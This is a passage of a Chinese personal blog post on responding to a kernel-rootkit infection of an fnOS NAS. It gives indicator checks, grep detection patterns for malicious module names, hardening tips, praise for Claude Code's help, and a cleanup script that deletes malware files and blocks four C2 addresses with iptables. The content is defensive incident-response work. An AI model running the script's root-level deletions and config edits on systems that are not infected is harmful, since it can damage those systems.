+<h3 id="5-3-行为IOC"><a href="#5-3-行为IOC" class="headerlink" title="5.3 行为IOC"></a>5.3 行为IOC</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"># 检查这些配置是否被篡改</span><br><span class="line">/etc/modules      # 是否有 async_memcpys、snd_pcap</span><br><span class="line">/etc/rc.local     # 是否有 gots 相关命令</span><br><span class="line"></span><br><span class="line"># 检查这些工具是否被删除</span><br><span class="line">/usr/bin/chattr   # 攻击者会删除此工具</span><br><span class="line"></span><br><span class="line"># 检查是否有无PID的监听端口</span><br><span class="line">netstat -tlnp | grep -v &quot;PID&quot;</span><br></pre></td></tr></table></figure>
+
+<hr>
+<h2 id="六、安全建议"><a href="#六、安全建议" class="headerlink" title="六、安全建议"></a>六、安全建议</h2><h3 id="6-1-紧急措施（如果你也是fnOS用户）"><a href="#6-1-紧急措施（如果你也是fnOS用户）" class="headerlink" title="6.1 紧急措施（如果你也是fnOS用户）"></a>6.1 紧急措施（如果你也是fnOS用户）</h3><ol>
+<li><strong>立即关闭公网访问</strong> - 包括端口映射、反向代理</li>
+<li><strong>检查CPU使用率</strong> - 异常高占用可能是挖矿</li>
+<li><strong>运行以下检查命令</strong>：</li>
+</ol>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 检查恶意内核模块</span></span><br><span class="line">lsmod | grep -E <span class="string">&quot;snd_pcap|async_memcpys&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 检查恶意文件</span></span><br><span class="line"><span class="built_in">ls</span> -la /sbin/gots /usr/bin/dockers /usr/bin/nginx 2&gt;/dev/null</span><br><span class="line"></span><br><span class="line"><span class="comment"># 检查/etc/modules</span></span><br><span class="line"><span class="built_in">cat</span> /etc/modules | grep -E <span class="string">&quot;snd_pcap|async_memcpys&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 检查/etc/rc.local</span></span><br><span class="line"><span class="built_in">cat</span> /etc/rc.local | grep gots</span><br><span class="line"></span><br><span class="line"><span class="comment"># 检查chattr是否存在</span></span><br><span class="line"><span class="built_in">which</span> chattr</span><br></pre></td></tr></table></figure>
+
+<ol start="4">
+<li><strong>升级到官方建议版本</strong> - fnOS 1.1.15</li>
+</ol>
+<h3 id="6-2-长期安全加固"><a href="#6-2-长期安全加固" class="headerlink" title="6.2 长期安全加固"></a>6.2 长期安全加固</h3><ol>
+<li><p><strong>SSH安全</strong></p>
+<ul>
+<li>更换默认端口（不要用22）</li>
+<li>使用密钥认证，禁用密码登录</li>
+<li>部署fail2ban</li>
+</ul>
+</li>
+<li><p><strong>网络安全</strong></p>
+<ul>
+<li>使用VPN访问NAS（如Tailscale、WireGuard）</li>
+<li>不要将管理端口暴露到公网</li>
+<li>配置防火墙限制出站连接</li>
+</ul>
+</li>
+<li><p><strong>系统监控</strong></p>
+<ul>
+<li>定期检查CPU使用率</li>
+<li>监控异常网络流量</li>
+<li>启用审计日志</li>
+</ul>
+</li>
+<li><p><strong>定期备份</strong></p>
+<ul>
+<li>使用3-2-1备份策略</li>
+<li>定期验证备份可用性</li>
+</ul>
+</li>
+</ol>
+<hr>
+<h2 id="七、经验总结"><a href="#七、经验总结" class="headerlink" title="七、经验总结"></a>七、经验总结</h2><h3 id="7-1-这次事件教会了我什么"><a href="#7-1-这次事件教会了我什么" class="headerlink" title="7.1 这次事件教会了我什么"></a>7.1 这次事件教会了我什么</h3><ol>
+<li><p><strong>NAS不应该直接暴露公网</strong> - 这是最重要的教训。即使使用HTTPS，也无法防御未知漏洞。</p>
+</li>
+<li><p><strong>定期检查系统状态</strong> - 如果我早点注意到CPU异常，可能不会被感染一年之久。</p>
+</li>
+<li><p><strong>内核级Rootkit非常难以检测</strong> - 普通的<code>top</code>、<code>ps</code>命令看不到隐藏的进程。</p>
+</li>
+<li><p><strong>攻击者会删除安全工具</strong> - 删除<code>chattr</code>是很聪明的反取证手段。</p>
+</li>
+<li><p><strong>日志清理是常规操作</strong> - 不要指望通过日志追踪攻击者。</p>
+</li>
+</ol>
+<h3 id="7-2-Claude-Code的帮助"><a href="#7-2-Claude-Code的帮助" class="headerlink" title="7.2 Claude Code的帮助"></a>7.2 Claude Code的帮助</h3><p>这次事件中，Claude Code帮了大忙：</p>
+<ul>
+<li><strong>自动化扫描</strong> - 快速定位可疑文件</li>
+<li><strong>内核模块分析</strong> - 提取和分析恶意代码</li>
+<li><strong>系统清理</strong> - 按正确顺序执行清理步骤</li>
+<li><strong>溯源分析</strong> - 搜索威胁情报，关联已知攻击</li>
+</ul>
+<p>作为一个非专业安全人员，有AI助手的帮助让我能够应对这种复杂的安全事件。</p>
+<h3 id="7-3-写在最后"><a href="#7-3-写在最后" class="headerlink" title="7.3 写在最后"></a>7.3 写在最后</h3><p>这次经历让我深刻认识到：<strong>安全无小事</strong>。</p>
+<p>一个NAS，存储着我所有的照片、文档、代码，如果被攻击者完全控制，后果不堪设想。更可怕的是，我的设备可能已经被用来攻击其他人——这让我感到很内疚。</p>
+<p>希望这篇文章能帮助其他fnOS用户检查和清理自己的系统。如果你发现了类似的感染，欢迎交流。</p>
+<p><strong>Stay safe, stay offline (for NAS).</strong></p>
+<hr>
+<h2 id="附录：完整清理脚本"><a href="#附录：完整清理脚本" class="headerlink" title="附录：完整清理脚本"></a>附录：完整清理脚本</h2><p>如果你确认系统已被感染，可以参考以下脚本进行清理：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"><span class="comment"># fnOS Rootkit清理脚本</span></span><br><span class="line"><span class="comment"># 警告：请先备份重要数据！</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;=== fnOS Rootkit 清理脚本 ===&quot;</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;警告：此脚本会修改系统配置，请确保你了解每一步操作&quot;</span></span><br><span class="line"><span class="built_in">read</span> -p <span class="string">&quot;确认继续？(yes/no): &quot;</span> confirm</span><br><span class="line"><span class="keyword">if</span> [ <span class="string">&quot;<span class="variable">$confirm</span>&quot;</span> != <span class="string">&quot;yes&quot;</span> ]; <span class="keyword">then</span></span><br><span class="line">    <span class="built_in">echo</span> <span class="string">&quot;已取消&quot;</span></span><br><span class="line">    <span class="built_in">exit</span> 1</span><br><span class="line"><span class="keyword">fi</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 1. 恢复chattr（如果被删除）</span></span><br><span class="line"><span class="keyword">if</span> ! <span class="built_in">command</span> -v chattr &amp;&gt; /dev/null; <span class="keyword">then</span></span><br><span class="line">    <span class="built_in">echo</span> <span class="string">&quot;[1/8] 恢复chattr工具...&quot;</span></span><br><span class="line">    <span class="built_in">cd</span> /tmp</span><br><span class="line">    wget -q https://mirrors.ustc.edu.cn/debian/pool/main/e/e2fsprogs/e2fsprogs_1.47.0-2+b2_amd64.deb</span><br><span class="line">    dpkg-deb -x e2fsprogs_1.47.0-2+b2_amd64.deb e2fsprogs_extract</span><br><span class="line">    <span class="built_in">sudo</span> <span class="built_in">cp</span> e2fsprogs_extract/usr/bin/chattr /usr/bin/chattr</span><br><span class="line">    <span class="built_in">sudo</span> <span class="built_in">chmod</span> 755 /usr/bin/chattr</span><br><span class="line">    <span class="built_in">rm</span> -rf e2fsprogs_extract e2fsprogs_1.47.0-2+b2_amd64.deb</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">    <span class="built_in">echo</span> <span class="string">&quot;[1/8] chattr工具存在，跳过&quot;</span></span><br><span class="line"><span class="keyword">fi</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 2. 移除immutable属性</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;[2/8] 移除immutable属性...&quot;</span></span><br><span class="line"><span class="built_in">sudo</span> chattr -i /sbin/gots 2&gt;/dev/null</span><br><span class="line"><span class="built_in">sudo</span> chattr -i /etc/rc.local 2&gt;/dev/null</span><br><span class="line"></span><br><span class="line"><span class="comment"># 3. 卸载恶意内核模块</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;[3/8] 卸载恶意内核模块...&quot;</span></span><br><span class="line"><span class="built_in">sudo</span> modprobe -r async_memcpys 2&gt;/dev/null</span><br><span class="line"><span class="built_in">sudo</span> modprobe -r snd_pcap 2&gt;/dev/null</span><br><span class="line"></span><br><span class="line"><span class="comment"># 4. 删除恶意文件</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;[4/8] 删除恶意文件...&quot;</span></span><br><span class="line"><span class="built_in">sudo</span> <span class="built_in">rm</span> -f /lib/modules/*/async_memcpys.ko</span><br><span class="line"><span class="built_in">sudo</span> <span class="built_in">rm</span> -f /lib/modules/*/snd_pcap.ko</span><br><span class="line"><span class="built_in">sudo</span> <span class="built_in">rm</span> -f /sbin/gots</span><br><span class="line"><span class="built_in">sudo</span> <span class="built_in">rm</span> -f /usr/bin/dockers</span><br><span class="line"><span class="built_in">sudo</span> <span class="built_in">rm</span> -f /usr/bin/4Va</span><br><span class="line"><span class="built_in">sudo</span> <span class="built_in">rm</span> -f /usr/bin/mNxc</span><br><span class="line"><span class="built_in">sudo</span> <span class="built_in">rm</span> -f /usr/bin/reMYUBLt</span><br><span class="line"><span class="built_in">sudo</span> <span class="built_in">rm</span> -f /usr/bin/nginx  <span class="comment"># 如果是恶意的</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 5. 清理/etc/modules</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;[5/8] 清理/etc/modules...&quot;</span></span><br><span class="line"><span class="built_in">sudo</span> sed -i <span class="string">&#x27;/async_memcpys/d&#x27;</span> /etc/modules</span><br><span class="line"><span class="built_in">sudo</span> sed -i <span class="string">&#x27;/snd_pcap/d&#x27;</span> /etc/modules</span><br><span class="line"></span><br><span class="line"><span class="comment"># 6. 清理/etc/rc.local</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;[6/8] 清理/etc/rc.local...&quot;</span></span><br><span class="line"><span class="built_in">sudo</span> sed -i <span class="string">&#x27;/gots/d&#x27;</span> /etc/rc.local</span><br><span class="line"></span><br><span class="line"><span class="comment"># 7. 封锁C2服务器</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;[7/8] 封锁C2服务器...&quot;</span></span><br><span class="line"><span class="keyword">for</span> ip <span class="keyword">in</span> 43.198.11.122 151.240.13.91 20.89.168.131 45.95.212.102; <span class="keyword">do</span></span><br><span class="line">    <span class="built_in">sudo</span> iptables -A INPUT -s <span class="variable">$ip</span> -j DROP</span><br><span class="line">    <span class="built_in">sudo</span> iptables -A OUTPUT -d <span class="variable">$ip</span> -j DROP</span><br><span class="line"><span class="keyword">done</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 保存iptables规则</span></span><br><span class="line"><span class="built_in">sudo</span> <span class="built_in">mkdir</span> -p /etc/iptables</span><br><span class="line"><span class="built_in">sudo</span> iptables-save | <span class="built_in">sudo</span> <span class="built_in">tee</span> /etc/iptables/rules.v4 &gt; /dev/null</span><br><span class="line"></span><br><span class="line"><span class="comment"># 8. 重建系统配置</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;[8/8] 重建系统配置...&quot;</span></span><br><span class="line"><span class="built_in">sudo</span> depmod -a</span><br><span class="line"><span class="built_in">sudo</span> update-initramfs -u -k $(<span class="built_in">uname</span> -r)</span><br><span class="line"></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;=== 清理完成 ===&quot;</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;请重启系统并验证：&quot;</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;  1. lsmod | grep -E &#x27;snd_pcap|async_memcpys&#x27;&quot;</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;  2. ls -la /sbin/gots&quot;</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;  3. top (检查CPU使用率)&quot;</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;建议：重启后修改所有密码！&quot;</span></span><br></pre></td></tr></table></figure>
+
+<hr>
+<p><strong>文章信息</strong></p>
+<ul>
+<li>作者：breeze</li>
+<li>日期：2026-02-01</li>
+<li>分类：安全事件、NAS、Rootkit</li>
+<li>标签：fnOS, 飞牛NAS, 内核Rootkit, 安全事件响应, Claude Code</li>
+</ul>
+<p><strong>相关链接</strong></p>
+<ul>
+<li><a target="_blank" rel="noopener" href="https://www.fortinet.com/blog/threat-research/deep-dive-into-a-linux-rootkit-malware">Fortinet: Deep Dive Into a Linux Rootkit Malware</a></li>
+<li><a target="_blank" rel="noopener" href="https://www.microsoft.com/en-us/security/blog/2022/05/19/rise-in-xorddos-a-deeper-look-at-the-stealthy-ddos-malware-targeting-linux-devices/">Microsoft: Rise in XorDdos</a></li>
+<li><a target="_blank" rel="noopener" href="https://www.elastic.co/security-labs/declawing-pumakit">Elastic: Declawing PUMAKIT</a></li>
+</ul>
+
+            </div>
+
+            <!-- Post information -->
+            
+    <div class="col-lg-8 offset-lg-2 col-md-10 offset-md-1 post-tags">
+        
+            <i class="fas fa-tag" style="vertical-align: middle;font-size: .8rem;"></i>
+            tags:&nbsp;
+            
+            
+        
+            <a href="/tags/fnOS/">#fnOS</a> <a href="/tags/飞牛NAS/">#飞牛NAS</a> <a href="/tags/Claude-Code/">#Claude Code</a> <a href="/tags/内核Rootkit/">#内核Rootkit</a> <a href="/tags/安全事件响应/">#安全事件响应</a>
+        
+    </div>
+
+            
+    <div class="col-lg-8 offset-lg-2 col-md-10 offset-md-1">
+        <ul class="pagination d-block text-center">
+            
+                <li class="previous page-item d-inline"><a href="/fnos_persistence_backdoor_2026/" class="page-link float-left">&larr;  下一页</a></li>
+            
+            
+                <li class="next page-item d-inline"><a href="/%E4%BF%AE%E5%A4%8D%E6%9C%8D%E5%8A%A1%E5%99%A8ssl%E8%AF%81%E4%B9%A6%E8%BF%87%E6%9C%9F/" class="page-link float-right">上一页  &rarr;</a></li>
+            
+        </ul>
+    </div>
+
+
+            
+                <!-- Comments -->
+                
+
+                
+
+            
+
+        </div>
+    </div>
+</article> 
+
+
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/tocbot/4.4.2/tocbot.css">
+    <style>
+        #toc-content .toc-link::before {
+            background-color: transparent;
+            max-height: 25px;
+        }
+
+        #toc-content .toc-link.is-active-link::before {
+            background-color: #404040;
+        }
+    </style>
+    <script src="//cdnjs.cloudflare.com/ajax/libs/tocbot/4.4.2/tocbot.min.js"></script>
+    <div class="ui-toc dropup scrollspy-body pull-right" style="right: 3%;">
+        <button type="button" class="toc-btn btn btn-light" data-toggle="dropdown" aria-haspopup="true" aria-expanded="false" data-display="static">
+            <i class="fas fa-list"></i>
+        </button>
+        <div class="dropdown-menu dropdown-menu-right p-2"  aria-labelledby="tocLabel">
+            <div class="toc-widget">
+                <div id="toc-content" class="text-truncate">
+                </div>
+            </div>
+            <div class="toc-menu pt-3 pl-4">
+                <a class="expand-toggle d-block py-1" href="#"><span class="expand-text">全部展开</span><span class="close-text" style="display: none;">全部收起</span></a>
+                <a class="back-to-top d-block py-1" href="#">回到顶部</a>
+                <a class="go-to-bottom d-block py-1" href="#">移至底部</a>
+            </div>
+        </div>
+    </div>
+    <script>
+        tocbot.init({
+            // Where to render the table of contents.
+            tocSelector: '#toc-content',
+            // Where to grab the headings to build the table of contents.
+            contentSelector: 'article',
+            // Which headings to grab inside of the contentSelector element.
+            headingSelector: 'h1, h2, h3',
+            // For headings inside relative or absolute positioned containers within content.
+            hasInnerContainers: true,
+        });
+    </script>
+
+
+    
+
+
+    <!-- Footer -->
+    <hr />
+
+<!-- Footer -->
+<footer id="footer">
+    <div class="container">
+        <div class="row">
+            <div class="col-lg-8 offset-lg-2 col-md-10 offset-md-1 text-center">
+                <ul class="list-inline">
+                    
+
+                    
+
+                    
+                        <li class="list-inline-item">
+                            <a rel="external" href="https://github.com/Scared-Heart" target="_blank">
+                                <span class="fa-stack fa-lg">
+                                    <i class="fa fa-circle fa-stack-2x"></i>
+                                    <i class="fab fa-github fa-stack-1x fa-inverse"></i>
+                                </span>
+                            </a>
+                        </li>
+                    
+
+                    
+
+                    
+
+                    
+                </ul>
+                <ul class="copyright footer-menu list-inline">
+                    
+                    
+                        <li class="list-inline-item">
+                            
+                            
+                            <a href="/">
+                                
+                                    Home
+                                
+                            </a>
+                        </li>
+                    
+                        <li class="list-inline-item">
+                            
+                                <span class="copyright-split">&nbsp;|&nbsp;</span>
+                            
+                            
+                            <a href="/archives">
+                                
+                                    Archives
+                                
+                            </a>
+                        </li>
+                    
+                </ul>
+                <p class="copyright footer-author">
+                    &copy; 2019-2026 
+                    <a rel="external" class="copyright-link" href="breeze chan" target="_blank">breeze chan</a><br/>
+                    Powered by <a rel="external" class="copyright-link" href="https://hexo.io/" target="_blank">Hexo</a>  
+                    <span class="copyright-split">&nbsp;|&nbsp;&nbsp;</span>
+                    Theme <a rel="external" class="copyright-link" href="https://github.com/luswdev/hexo-theme-clean.git" target="_blank">Clean</a>
+                    
+                    
+                </p>
+            </div>
+        </div>
+    </div>
+</footer>
+
+
+    <!-- After footer scripts -->
+    <!-- jQuery -->
+<script src="//cdn.jsdelivr.net/npm/jquery@2.1.4/dist/jquery.min.js"></script>
+
+<!-- For drop down -->
+<script src="//cdn.jsdelivr.net/npm/popper.js@1.16.0/dist/umd/popper.min.js"></script>
+
+<!-- Bootstrap -->
+<script src="//cdn.jsdelivr.net/npm/bootstrap@4.4.1/dist/js/bootstrap.min.js"></script>
+<!-- Gallery -->
+<script src="//cdn.jsdelivr.net/npm/lightgallery@1.6.11/dist/js/lightgallery-all.min.js"></script>
+<!-- Busuanzi -->
+
+
+<!-- Search script -->
+
+<script src="/js/search.js"></script>
+
+<script type="text/javascript">
+    $(function () {
+        searchFunc( '/search.xml' , 'searchInput', 'searchResult');
+    });
+</script>
+
+
+
+<script src="/js/main.js"></script>
+
+
+
+    <!-- Search Modal -->
+    <!-- Modal -->
+<div class="modal fade" id="searchModal" tabindex="-1" role="dialog" aria-labelledby="myModalLabel">
+    <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+        <div class="modal-content overflow-auto">
+            <div class="modal-header">
+                <input type="text" class="form-control" placeholder="搜索关键词..." id="searchInput">
+                <button type="button" class="close" data-dismiss="modal" aria-label="Close"><i class="fas fa-times"></i></button>
+            </div>
+            <div class="modal-body">
+                <div id="searchResult">
+                    <div class="search-empty text-center text-muted p-5">
+                        <i class="far fa-meh"></i>
+                    </div>
+                </div>
+            </div> 
+        </div>
+    </div>
+</div>
+
+
+</body>
+</html>
